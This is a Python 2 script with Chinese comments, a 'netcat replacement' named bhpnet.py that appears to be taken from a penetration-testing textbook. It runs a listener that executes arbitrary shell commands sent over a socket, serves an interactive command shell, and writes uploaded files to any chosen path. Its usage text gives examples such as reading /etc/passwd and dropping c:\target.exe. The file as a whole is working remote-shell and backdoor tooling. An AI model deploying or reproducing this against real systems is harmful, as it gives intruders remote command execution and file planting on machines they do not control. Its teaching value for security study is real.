#!/usr/bin/env python
#-*- coding:utf-8 -*-
import sys
import socket
import getopt
import threading
import subprocess

listen = False
command = False
upload = False
execute = ""
target = ""
upload_destination = ""
port = 0

def run_command(command):
    #rsrip删除字符串末尾指定字符，默认为空格
    command = command.rstrip()

    #运行命令输出结果
    try:
        output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
    except:
        output = "Failed to execute command.\r\n"

    #返回结果
    return output

def client_handler(client_socket):
    global upload
    global execute
    global command

    #如果有upload参数，则保存客户端发来的数据
    if len(upload_destination):

        #数据串
        file_buffer = ""

        #持续读数据
        while True:
            data = client_socket.recv(1024)

            if not data:
                break
            else:
                file_buffer += data

        #写入数据
        try:
            file_descriptor = open(upload_destination, "wb")
            file_descriptor.write(file_buffer)
            file_descriptor.close()

            #向客户断发送成功消息
            client_socket.send("Successfully saved file to %s\r\n" % upload_destination)
        except:
            client_socket.send("Failed to save file to %s\r\n" % upload_destination)

    #如果有execute参数，在本地执行命令，并返回结果给客户端
    if len(execute):
        # run the command
        output = run_command(execute)

        client_socket.send(output)

    #如果有command参数，服务端接受客户端发来的命令，并执行返回结果
    if command:

        while True:
            #发送字符，表示输入命令
            client_socket.send("<BHP:#> ")

            #接受命令
            cmd_buffer = ""
            while "\n" not in cmd_buffer:
                cmd_buffer += client_socket.recv(1024)

            #使用run_command执行命令
            response = run_command(cmd_buffer)

            #返回结果
            client_socket.send(response)

def server_loop():
    global target
    global port

    #如果没有指定ip
    if not len(target):
        target = "0.0.0.0"

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((target, port))
    #最大接受五个客户端
    server.listen(5)

    while True:
        client_socket, addr = server.accept()

        #开启一个线程处理客户端
        client_thread = threading.Thread(target=client_handler, args=(client_socket,))
        client_thread.start()


#客户端函数，发送数据，接受数据
def client_sender(buffer):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        #连接服务器
        client.connect((target, port))

        # if we detect input from stdin send it
        # if not we are going to wait for the user to punch some in

        if len(buffer):
            client.send(buffer)

        while True:

            # now wait for data back
            recv_len = 1
            response = ""

            while recv_len:
                data = client.recv(4096)
                recv_len = len(data)
                response += data

                if recv_len < 4096:
                    break

            print response,

            # wait for more input
            buffer = raw_input("")
            #raw_input、input为python内置函数，可接收控制台输入
            #raw_input接收字符串，input接收python表达式

            buffer += "\n"

            # send it off
            client.send(buffer)


    except:
        # just catch generic errors - you can do your homework to beef this up
        print "[*] Exception! Exiting."
        # teardown the connection
        client.close()

#提示程序用法
def usage():
    print "Netcat Replacement"
    print
    print "Usage: bhpnet.py -t target_host -p port"
    print "-l --listen                - listen on [host]:[port] for incoming connections"
    print "-e --execute=file_to_run   - execute the given file upon receiving a connection"
    print "-c --command               - initialize a command shell"
    print "-u --upload=destination    - upon receiving connection upload a file and write to [destination]"
    print
    print
    print "Examples: "
    print "bhpnet.py -t 192.168.0.1 -p 5555 -l -c"
    print "bhpnet.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe"
    print "bhpnet.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\""
    print "echo 'ABCDEFGHI' | ./bhpnet.py -t 192.168.11.12 -p 135"
    sys.exit(0)


def main():
    global listen
    global port
    global execute
    global command
    global upload_destination
    global target

    if not len(sys.argv[1:]):
        usage()

    # read the commandline options
    try:
        opts, args = getopt.getopt(sys.argv[1:], "hle:t:p:cu:",
                                   ["help", "listen", "execute=", "target=", "port=", "command", "upload="])
    except getopt.GetoptError as err:
        print str(err)
        usage()

    for o, a in opts:
        if o in ("-h", "--help"):
            usage()
        elif o in ("-l", "--listen"):
            listen = True
        elif o in ("-e", "--execute"):
            execute = a
        elif o in ("-c", "--commandshell"):
            command = True
        elif o in ("-u", "--upload"):
            upload_destination = a
        elif o in ("-t", "--target"):
            target = a
        elif o in ("-p", "--port"):
            port = int(a)
        else:
            assert False, "Unhandled Option"

    # are we going to listen or just send data from stdin
    if not listen and len(target) and port > 0:
        # read in the buffer from the commandline
        # this will block, so send CTRL-D if not sending input
        # to stdin
        buffer = sys.stdin.read()

        # send data off
        client_sender(buffer)

        # we are going to listen and potentially
    # upload things, execute commands and drop a shell back
    # depending on our command line options above
    if listen:
        server_loop()


main()
